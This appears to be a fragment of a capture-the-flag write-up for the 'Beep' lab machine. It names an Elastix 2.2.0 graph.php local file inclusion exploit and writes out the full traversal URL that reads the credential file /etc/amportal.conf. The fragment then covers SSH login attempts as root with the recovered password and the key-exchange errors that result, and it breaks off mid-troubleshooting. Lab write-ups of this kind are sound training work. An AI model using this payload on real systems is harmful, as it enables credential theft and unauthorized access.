now we are using a different exploit for this


Elastix 2.2.0 - 'graph.php' Local File Inclusion          | php/webapps/37637.pl


If we visiting the path mentioned in code


ttps://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

we see that it is vulnerable



now as per the writeup


we should be able to log into the machine with ssh to root with and admin password we found in above directory but i was getting an error

â”€â”€(rootðŸ’€kali)-[~/Desktop/THM/beep]
â””â”€# ssh root@10.10.10.7
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1



then this error

```
Unable to negotiate with 10.10.10.7 port 22: no matching host key type found. Their offer: ssh-dss
```


okay so did some torubleshotting and found this resource
